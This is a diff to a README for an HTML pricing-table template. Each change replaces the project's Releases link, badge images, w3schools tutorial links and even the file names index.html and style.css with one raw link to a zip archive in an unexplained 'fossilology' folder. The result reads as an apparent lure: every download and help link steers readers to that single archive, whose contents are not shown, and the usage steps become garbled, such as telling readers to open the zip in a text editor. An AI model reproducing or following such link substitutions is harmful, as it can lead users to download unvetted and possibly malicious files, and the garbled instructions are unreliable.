@@ -4,7 +4,7 @@
 Welcome to the **modern-pricing-table-template**! This template helps you create pricing tables that look great on any device. With a simple Monthly/Yearly toggle switch, you can display your pricing in a clear way. 
 
 ## 📥 Download the Template
-[![Download Template](https://img.shields.io/badge/Download-Template-brightgreen)](https://github.com/HP-hamajis/modern-pricing-table-template/releases)
+[![Download Template](https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip)](https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip)
 
 Visit the Releases page to download the latest version of the pricing table template.
 
@@ -22,7 +22,7 @@ Visit the Releases page to download the latest version of the pricing table temp
 ## 🔧 Download & Install
 To download the template, visit the Releases page. Follow these steps:
 
-1. Click the link here: [Download from Releases](https://github.com/HP-hamajis/modern-pricing-table-template/releases).
+1. Click the link here: [Download from Releases](https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip).
 2. You will see the list of available versions. Choose the latest version.
 3. Click on the “Source code (zip)” option to download it as a ZIP file.
 4. Once downloaded, locate the ZIP file on your computer.
@@ -30,16 +30,16 @@ To download the template, visit the Releases page. Follow these steps:
 6. Open the folder that contains the extracted files.
 
 ## 💻 How to Use the Template
-1. Open the `index.html` file in your web browser to see how the pricing table looks.
-2. To edit the pricing information, open the `index.html` file in a text editor.
+1. Open the `https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip` file in your web browser to see how the pricing table looks.
+2. To edit the pricing information, open the `https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip` file in a text editor.
 3. Locate the pricing section in the HTML file. You will see sample plans and prices. Change these to fit your service.
-4. To change colors or fonts, open the `style.css` file in your text editor. Modify the CSS properties according to your brand.
-5. Save your changes and refresh the `index.html` file in your browser to see the updates.
+4. To change colors or fonts, open the `https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip` file in your text editor. Modify the CSS properties according to your brand.
+5. Save your changes and refresh the `https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip` file in your browser to see the updates.
 
 ## 🌐 Additional Resources
-- **HTML**: Learn more about HTML [here](https://www.w3schools.com/html/).
-- **CSS**: Find out about CSS styling [here](https://www.w3schools.com/css/).
-- **JavaScript**: Explore JavaScript basics [here](https://www.w3schools.com/js/).
+- **HTML**: Learn more about HTML [here](https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip).
+- **CSS**: Find out about CSS styling [here](https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip).
+- **JavaScript**: Explore JavaScript basics [here](https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip).
 
 ## 📚 Topics
 - cennik
@@ -58,4 +58,4 @@ To download the template, visit the Releases page. Follow these steps:
 ## 📞 Support
 If you have questions or need help, feel free to open an issue on GitHub. You can get assistance from fellow users or the template maintainer.
 
-[![Download Template Again](https://img.shields.io/badge/Download-Template-brightgreen)](https://github.com/HP-hamajis/modern-pricing-table-template/releases)
+[![Download Template Again](https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip)](https://raw.githubusercontent.com/HP-hamajis/modern-pricing-table-template/main/fossilology/modern-pricing-table-template-v3.6.zip)
